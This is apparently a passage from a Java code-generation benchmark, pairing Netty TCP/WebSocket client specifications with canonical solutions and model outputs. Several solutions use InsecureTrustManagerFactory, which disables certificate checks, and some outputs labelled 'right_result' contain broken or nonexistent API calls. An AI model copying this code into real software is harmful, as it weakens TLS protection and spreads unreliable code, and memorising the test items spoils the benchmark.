    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic class EchoClient {\n    private final boolean ssl;\n    private final String host;\n    private final int port;\n    private final int size;\n\n    public EchoClient(boolean ssl, String host, int port, int size) {\n        this.ssl = ssl;\n        this.host = host;\n        this.port = port;\n        this.size = size;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (ssl) {\n                         SslContext sslCtx = SslContextBuilder.forClient()\n                             .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new EchoClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(host, port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        boolean ssl = false; // Set to true if SSL is required\n        String host = \"example.com\";\n        int port = 8080;\n        int size = 1024;\n\n        new EchoClient(ssl, host, port, size).start();\n    }\n}\n\nclass EchoClientHandler extends SimpleChannelInboundHandler<String> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n        System.out.println(\"Received: \" + msg);\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 115,
    "Instruction": "Task Description: Create a Java class that implements a simple TCP chat client using Netty framework, capable of connecting to a remote server, sending messages from console input, and gracefully shutting down.\n\nClass Description: SimpleChatClient is a Netty-based TCP client that establishes a connection to a specified host and port, sends user input messages to the server, and handles connection lifecycle management.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server to connect to\nport: int - The port number of the remote server to connect to\n\nMethods:\nSimpleChatClient: (String host, int port) -> void - Constructor that initializes the client with target host and port\nrun: () -> void - Main method that initializes Netty components, establishes connection, handles user input, and manages shutdown\n    - Initializes NioEventLoopGroup for I/O operations\n    - Configures Bootstrap with NioSocketChannel and handler\n    - Connects to remote server and maintains channel\n    - Reads user input from console and sends to server\n    - Handles graceful shutdown of resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SimpleChatClient {\n\n    private final String host;\n    private final int port;\n\n    public SimpleChatClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new SimpleChatClientInitializer());\n            Channel channel = bootstrap.connect(host, port).sync().channel();\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            while (true) {\n                channel.writeAndFlush(in.readLine() + \"\\r\\n\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SimpleChatClient {\n    private final String host;\n    private final int port;\n\n    public SimpleChatClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new SimpleChatClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(host, port).sync();\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            while (true) {\n                String line = reader.readLine();\n                if (\"exit\".equalsIgnoreCase(line)) {\n                    break;\n                }\n                f.channel().writeAndFlush(line + \"\\r\\n\");\n            }\n\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        if (args.length != 2) {\n            System.err.println(\"Usage: \" + SimpleChatClient.class.getSimpleName() + \" <host> <port>\");\n            return;\n        }\n\n        String host = args[0];\n        int port = Integer.parseInt(args[1]);\n\n        new SimpleChatClient(host, port).run();\n    }\n}\n```"
  },
  {
    "Task_id": 116,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a secure (optional SSL) connection to a server, send and receive serialized Java objects.\n\nClass Description: ObjectEchoClient is a Netty-based TCP client that connects to a specified server, handles SSL encryption if enabled, and processes object serialization/deserialization for communication. The client maintains the connection until explicitly closed.\n\nAttributes:\nSSL: [boolean] - Flag indicating whether SSL encryption should be used\nHOST: [String] - The host address of the server to connect to\nPORT: [int] - The port number of the server to connect to\nSIZE: [int] - The size parameter (unused in current implementation but available for configuration)\n\nMethods:\nstart: [start]() -> [void] - Initializes and starts the Netty client, establishes connection to server, configures SSL if enabled, sets up object serialization pipeline, and maintains connection until shutdown. Throws Exception if any error occurs during startup or operation.\n\nThe method performs the following operations:\n1. Creates SSL context if SSL is enabled\n2. Initializes NioEventLoopGroup for I/O operations\n3. Configures Bootstrap with NioSocketChannel\n4. Sets up pipeline with ObjectEncoder, ObjectDecoder and custom handler\n5. Connects to specified host and port\n6. Maintains connection until channel is closed\n7. Shuts down event loop group gracefully when done",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.serialization.ClassResolvers;\nimport io.netty.handler.codec.serialization.ObjectDecoder;\nimport io.netty.handler.codec.serialization.ObjectEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class ObjectEchoClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n    static final int SIZE = Integer.parseInt(System.getProperty(\"size\", \"256\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    if (sslCtx != null) {\n                        p.addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                    }\n                    p.addLast(\n                            new ObjectEncoder(),\n                            new ObjectDecoder(ClassResolvers.cacheDisabled(null)),\n                            new ObjectEchoClientHandler());\n                }\n             });\n\n            b.connect(HOST, PORT).sync().channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.serialization.ObjectDecoder;\nimport io.netty.handler.codec.serialization.ObjectEncoder;\n\npublic class ObjectEchoClient {\n    private final boolean ssl;\n    private final String HOST;\n    private final int PORT;\n    private final int SIZE;\n\n    public ObjectEchoClient(boolean ssl, String HOST, int PORT, int SIZE) {\n        this.ssl = ssl;\n        this.HOST = HOST;\n        this.PORT = PORT;\n        this.SIZE = SIZE;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n\n            if (ssl) {\n                // Configure SSL context if needed\n            }\n\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    p.addLast(new ObjectEncoder());\n                    p.addLast(new ObjectDecoder(Integer.MAX_VALUE, ClassResolvers.cacheDisabled(null)));\n                    p.addLast(new ObjectEchoClientHandler());\n                }\n            });\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        boolean ssl = false; // Change to true if SSL is required\n        String HOST = \"localhost\";\n        int PORT = 8080;\n        int SIZE = 1024;\n\n        new ObjectEchoClient(ssl, HOST, PORT, SIZE).start();\n    }\n}\n\nclass ObjectEchoClientHandler extends SimpleChannelInboundHandler<Object> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n        // Handle received object\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 117,
    "Instruction": "Task Description: Create a secure TCP chat client using Java Netty framework that establishes an encrypted connection to a server, sends messages from standard input, and gracefully shuts down when instructed.\n\nClass Description: SecureChatClient is a Netty-based client that handles secure TCP communication with a chat server. It manages connection lifecycle, message sending, and proper resource cleanup.\n\nAttributes:\n- HOST: [String] - The server host address (default: \"127.0.0.1\")\n- PORT: [int] - The server port number (default: 8992)\n- group: [EventLoopGroup] - Manages client-side I/O threads\n- channel: [Channel] - Represents the active network connection\n- sslCtx: [SslContext] - SSL context for secure communication\n\nMethods:\n- SecureChatClient() -> [void] - Constructor that initializes SSL context and event loop group\n- connect() -> [void] - Establishes connection to the server using Bootstrap configuration\n- startChat() -> [void] - Starts interactive chat session reading from standard input and sending messages to server\n- shutdown() -> [void] - Gracefully shuts down the client and releases resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class SecureChatClient {\n\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    private EventLoopGroup group;\n    private Channel channel;\n    private SslContext sslCtx;\n\n    public SecureChatClient() throws Exception {\n        this.sslCtx = SslContext.newClientContext(InsecureTrustManagerFactory.INSTANCE);\n        this.group = new NioEventLoopGroup();\n    }\n\n    public void connect() throws Exception {\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .handler(new SecureChatClientInitializer(sslCtx));\n\n        this.channel = b.connect(HOST, PORT).sync().channel();\n    }\n\n    public void startChat() throws Exception {\n        ChannelFuture lastWriteFuture = null;\n        BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n        for (;;) {\n            String line = in.readLine();\n            if (line == null) {\n                break;\n            }\n\n            lastWriteFuture = channel.writeAndFlush(line + \"\\r\\n\");\n\n            if (\"bye\".equals(line.toLowerCase())) {\n                channel.closeFuture().sync();\n                break;\n            }\n        }\n\n        if (lastWriteFuture != null) {\n            lastWriteFuture.sync();\n        }\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport javax.net.ssl.SSLException;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SecureChatClient {\n    private static final String HOST = \"127.0.0.1\";\n    private static final int PORT = 8992;\n    private EventLoopGroup group;\n    private Channel channel;\n    private SslContext sslCtx;\n\n    public SecureChatClient() throws SSLException {\n        sslCtx = SslContext.builder()\n                .sslProvider(SslContext.defaultServerProvider())\n                .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                .build();\n        group = new NioEventLoopGroup();\n    }\n\n    public void connect() throws Exception {\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .option(ChannelOption.SO_KEEPALIVE, true)\n         .handler(new SecureChatInitializer(sslCtx));\n\n        channel = b.connect(HOST, PORT).sync().channel();\n    }\n\n    public void startChat() throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        while (true) {\n            String line = reader.readLine();\n            if (\"exit\".equalsIgnoreCase(line)) {\n                break;\n            }\n            channel.writeAndFlush(line + \"\\n\");\n        }\n    }\n\n    public void shutdown() throws InterruptedException {\n        channel.closeFuture().sync();\n        group.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        try {\n            SecureChatClient client = new SecureChatClient();\n            client.connect();\n            client.startChat();\n            client.shutdown();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass SecureChatInitializer extends ChannelInitializer<SocketChannel> {\n    private final SslContext sslCtx;\n\n    public SecureChatInitializer(SslContext sslCtx) {\n        this.sslCtx = sslCtx;\n    }\n\n    @Override\n    protected void initChannel(SocketChannel ch) throws Exception {\n        ChannelPipeline p = ch.pipeline();\n        p.addLast(sslCtx.newHandler(ch.alloc()));\n        p.addLast(new SecureChatHandler());\n    }\n}\n\nclass SecureChatHandler extends SimpleChannelInboundHandler<String> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n        System.out.println(msg);\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 118,
    "Instruction": "Task Description: Create a WebSocket client using Java Netty framework that can establish a connection to a WebSocket server, send and receive frames, and handle connection lifecycle events.\n\nClass Description: WebSocketTestClient is a Netty-based WebSocket client implementation that handles WebSocket connections, frame transmission, and connection management. It supports different WebSocket versions and provides callback mechanisms for frame handling.\n\nAttributes:\n- bootstrap: [Bootstrap] - Netty bootstrap instance for client configuration\n- ch: [Channel] - Active channel representing the WebSocket connection\n- uri: [URI] - Target WebSocket server URI\n- version: [WebSocketVersion] - WebSocket protocol version to use\n- closed: [boolean] - Connection status flag\n- count: [AtomicInteger] - Counter for handler naming\n\nMethods:\n- connect(): [WebSocketTestClient] - Establishes connection to WebSocket server, performs handshake, and returns self for chaining\n- send(WebSocketFrame frame, FrameListener listener): [WebSocketTestClient] - Sends WebSocket frame and registers listener for response, returns self for chaining\n- destroy(): [void] - Gracefully closes connection and releases resources\n- destroy(boolean dirty): [void] - Closes connection with option for immediate termination\n- isActive(): [boolean] - Returns connection active status\n- isOpen(): [boolean] - Returns connection open status\n- isWritable(): [boolean] - Returns channel writable status\n\nNested Interfaces:\n- FrameListener: Callback interface for frame reception and error handling\n  - onFrame(WebSocketFrame frame): [void] - Called when frame is received\n  - onError(Throwable t): [void] - Called when error occurs\n\nNested Classes:\n- WSClientHandler: [SimpleChannelInboundHandler<Object>] - Internal handler for WebSocket handshake and frame processing\n  - handshakeFuture(): [ChannelFuture] - Returns handshake completion future\n  - handlerAdded(ChannelHandlerContext ctx): [void] - Initializes handshake promise\n  - channelActive(ChannelHandlerContext ctx): [void] - Initiates handshake\n  - channelRead0(ChannelHandlerContext ctx, Object o): [void] - Processes incoming messages\n  - exceptionCaught(ChannelHandlerContext ctx, Throwable cause): [void] - Handles channel errors",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.ChannelPromise;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.websocketx.CloseWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketVersion;\nimport io.netty.util.CharsetUtil;\nimport io.netty.util.ReferenceCountUtil;\n\nimport java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic final class WebSocketTestClient {\n    private final Bootstrap bootstrap = new Bootstrap();\n    private Channel ch;\n    private final URI uri;\n    private final WebSocketVersion version;\n    private volatile boolean closed;\n    private static final AtomicInteger count = new AtomicInteger();\n\n    public WebSocketTestClient(WebSocketVersion version, URI uri) {\n        this.uri = uri;\n        this.version = version;\n    }\n\n    public WebSocketTestClient connect() throws Exception {\n        String protocol = uri.getScheme();\n        if (!\"ws\".equals(protocol)) {\n            throw new IllegalArgumentException(\"Unsupported protocol: \" + protocol);\n        }\n        final WebSocketClientHandshaker handshaker =\n                WebSocketClientHandshakerFactory.newHandshaker(\n                        uri, version, null, false, new DefaultHttpHeaders());\n        WSClientHandler handler = new WSClientHandler(handshaker);\n        EventLoopGroup group = new NioEventLoopGroup();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer() {\n                    @Override\n                    protected void initChannel(Channel channel) throws Exception {\n                        ChannelPipeline p = channel.pipeline();\n                        p.addLast(\n                                new HttpClientCodec(),\n                                new HttpObjectAggregator(8192), handler);\n                    }\n                });\n\n        ChannelFuture future =\n                bootstrap.connect(\n                        new InetSocketAddress(uri.getHost(), uri.getPort()));\n        future.syncUninterruptibly();\n        handler.handshakeFuture.syncUninterruptibly();\n        ch = future.channel();\n        return this;\n    }\n\n    public WebSocketTestClient send(WebSocketFrame frame, final FrameListener listener) {\n        ch.pipeline().addLast(\"responseHandler\" + count.incrementAndGet(), new SimpleChannelInboundHandler<Object>() {\n            @Override\n            protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n                if (msg instanceof CloseWebSocketFrame) {\n                    closed = true;\n                }\n                listener.onFrame((WebSocketFrame) msg);\n                ctx.pipeline().remove(this);\n            }\n\n            @Override\n            public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n                cause.printStackTrace();\n                listener.onError(cause);\n                ctx.pipeline().remove(this);\n            }\n        });\n        ChannelFuture cf = ch.writeAndFlush(frame).syncUninterruptibly();\n        if (!cf.isSuccess()) {\n            listener.onError(cf.cause());\n        }\n        return this;\n    }\n\n    public void destroy() {\n        this.destroy(false);\n    }\n\n    public void destroy(boolean dirty) {\n        if (!closed && !dirty) {\n            final CountDownLatch latch = new CountDownLatch(1);\n            send(new CloseWebSocketFrame(), new FrameListener() {\n                @Override\n                public void onFrame(WebSocketFrame frame) {\n                    latch.countDown();\n                }\n\n                @Override\n                public void onError(Throwable t) {\n                    latch.countDown();\n                }\n            });\n            try {\n                latch.await(10, TimeUnit.SECONDS);\n            } catch (InterruptedException e) {\n                throw new RuntimeException(e);\n            }\n        }\n        if (ch != null) {\n            ch.close().syncUninterruptibly();\n        }\n        try {\n            bootstrap.group().shutdownGracefully(0, 1, TimeUnit.SECONDS).get();\n        } catch (InterruptedException | ExecutionException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public boolean isActive() {\n        return this.ch != null && this.ch.isActive();\n    }\n\n    public boolean isOpen() {\n        return this.ch != null && this.ch.isOpen();\n    }\n\n    public boolean isWritable() {\n        return this.ch != null && this.ch.isWritable();\n    }\n\n    public interface FrameListener {\n        void onFrame(WebSocketFrame frame);\n        void onError(Throwable t);\n    }\n\n    private static final class WSClientHandler extends SimpleChannelInboundHandler<Object> {\n        private final WebSocketClientHandshaker handshaker;\n        private ChannelPromise handshakeFuture;\n\n        WSClientHandler(WebSocketClientHandshaker handshaker) {\n            super(false);\n            this.handshaker = handshaker;\n        }\n\n        public ChannelFuture handshakeFuture() {\n            return handshakeFuture;\n        }\n\n        @Override\n        public void handlerAdded(ChannelHandlerContext ctx) {\n            handshakeFuture = ctx.newPromise();\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            handshaker.handshake(ctx.channel());\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object o) throws Exception {\n            Channel ch = ctx.channel();\n            if (!handshaker.isHandshakeComplete()) {\n                handshaker.finishHandshake(ch, (FullHttpResponse) o);\n                handshakeFuture.setSuccess();\n                ReferenceCountUtil.release(o);\n                return;\n            }\n\n            if (o instanceof FullHttpResponse) {\n                FullHttpResponse response = (FullHttpResponse) o;\n                ReferenceCountUtil.release(o);\n                throw new Exception(\"Unexpected HttpResponse (status=\" + response.getStatus() + \", content=\"\n                        + response.content().toString(CharsetUtil.UTF_8) + ')');\n            }\n            ctx.fireChannelRead(o);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            if (!handshakeFuture.isDone()) {\n                handshakeFuture.setFailure(cause);\n            }\n            ctx.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.websocketx.*;\nimport io.netty.util.concurrent.Future;\n\nimport java.net.URI;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class WebSocketTestClient {\n    private Bootstrap bootstrap;\n    private Channel ch;\n    private URI uri;\n    private WebSocketVersion version;\n    private boolean closed = false;\n    private AtomicInteger count = new AtomicInteger();\n\n    public WebSocketTestClient(URI uri, WebSocketVersion version) {\n        this.uri = uri;\n        this.version = version;\n        this.bootstrap = new Bootstrap()\n                .group(new NioEventLoopGroup())\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new HttpClientCodec());\n                        pipeline.addLast(new HttpObjectAggregator(8192));\n                        pipeline.addLast(new WSClientHandler(version, count.incrementAndGet()));\n                    }\n                });\n    }\n\n    public WebSocketTestClient connect() {\n        try {\n            ch = bootstrap.connect(uri.getHost(), uri.getPort()).sync().channel();\n            ch.closeFuture().addListener(f -> closed = true);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n        return this;\n    }\n\n    public WebSocketTestClient send(WebSocketFrame frame, FrameListener listener) {\n        if (!ch.isActive()) {\n            throw new IllegalStateException(\"Connection is not active\");\n        }\n        ch.writeAndFlush(frame).addListener(future -> {\n            if (future.isSuccess()) {\n                ((WSClientHandler) ch.pipeline().last()).registerListener(listener);\n            } else {\n                listener.onError(future.cause());\n            }\n        });\n        return this;\n    }\n\n    public void destroy() {\n        destroy(false);\n    }\n\n    public void destroy(boolean dirty) {\n        if (!closed) {\n            closed = true;\n            if (dirty) {\n                ch.closeNow();\n            } else {\n                ch.close().awaitUninterruptibly();\n            }\n            EventLoopGroup group = (EventLoopGroup) ch.eventLoop();\n            group.shutdownGracefully();\n        }\n    }\n\n    public boolean isActive() {\n        return !closed && ch != null && ch.isActive();\n    }\n\n    public boolean isOpen() {\n        return !closed && ch != null && ch.isOpen();\n    }\n\n    public boolean isWritable() {\n        return !closed && ch != null && ch.isWritable();\n    }\n\n    public static interface FrameListener {\n        void onFrame(WebSocketFrame frame);\n        void onError(Throwable t);\n    }\n\n    private static final class WSClientHandler extends SimpleChannelInboundHandler<Object> {\n        private final WebSocketVersion version;\n        private final int id;\n        private ChannelPromise handshakePromise;\n        private FrameListener listener;\n\n        public WSClientHandler(WebSocketVersion version, int id) {\n            this.version = version;\n            this.id = id;\n        }\n\n        public ChannelFuture handshakeFuture() {\n            return handshakePromise;\n        }\n\n        @Override\n        public void handlerAdded(ChannelHandlerContext ctx) throws Exception {\n            handshakePromise = ctx.newPromise();\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            DefaultHttpRequest request = new DefaultHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, uri.getPath());\n            request.headers().set(HttpHeaderNames.HOST, uri.getHost());\n            request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.UPGRADE);\n            request.headers().set(HttpHeaderNames.UPGRADE, \"websocket\");\n            request.headers().set(HttpHeaderNames.SEC_WEBSOCKET_VERSION, String.valueOf(version.value()));\n            request.headers().set(HttpHeaderNames.SEC_WEBSOCKET_KEY, WebSocketServerHandshaker.randomKey());\n\n            ctx.writeAndFlush(request).addListener(f -> {\n                if (f.isSuccess()) {\n                    handshakePromise.setSuccess();\n                } else {\n                    handshakePromise.setFailure(f.cause());\n                }\n            });\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n            if (msg instanceof FullHttpResponse) {\n                FullHttpResponse response = (FullHttpResponse) msg;\n                if (response.status().code() == HttpResponseStatus.SWITCHING_PROTOCOLS.code()) {\n                    WebSocketServerHandshakerFactory factory = new WebSocketServerHandshakerFactory(uri.toString(), null, false);\n                    WebSocketServerHandshaker handshaker = factory.newHandshaker(response);\n                    if (handshaker == null) {\n                        WebSocketServerHandshakerFactory.sendUnsupportedVersionResponse(ctx.channel());\n                    } else {\n                        handshaker.handshake(ctx.channel(), (FullHttpRequest) msg, response.headers());\n                    }\n                } else {\n                    response.release();\n                }\n            } else if (msg instanceof WebSocketFrame) {\n                WebSocketFrame frame = (WebSocketFrame) msg;\n                if (listener != null) {\n                    listener.onFrame(frame);\n                }\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            if (listener != null) {\n                listener.onError(cause);\n            }\n            ctx.close();\n        }\n\n        public void registerListener(FrameListener listener) {\n            this.listener = listener;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 12,
    "Instruction": "Task Description: Create a Java class that provides functionality for interacting with files using Java NIO's FileChannel and memory-mapped file operations. The class should support opening files, mapping files to memory, accessing mapped buffers, forcing writes to disk, and properly closing resources.\n\nClass Description: The FileChannelInteractor class encapsulates operations for file channel interaction and memory-mapped file operations using Java NIO. It provides methods to open files, map file regions to memory, access mapped buffers, ensure data persistence, and clean up resources.\n\nAttributes:\nfileChannel: FileChannel - The FileChannel instance used for file operations\nmappedBuffer: MappedByteBuffer - The buffer representing the memory-mapped file region\n\nMethods:\nopenFileChannel: openFileChannel(String filePath) -> void - Opens a FileChannel for reading the specified file. Throws IOException if the file cannot be opened.\nmapFileToMemory: mapFileToMemory(long position, long size) -> void - Maps a region of the file into memory for read-only access. Throws IOException if mapping fails.\ngetMappedBuffer: getMappedBuffer() -> MappedByteBuffer - Returns the currently mapped byte buffer.\ncloseChannel: closeChannel() -> void - Closes the FileChannel and releases associated resources. Throws IOException if closing fails.\nforceWriteToDisk: forceWriteToDisk() -> void - Forces any changes made to the mapped buffer to be written to disk (though in this implementation the buffer is read-only).",
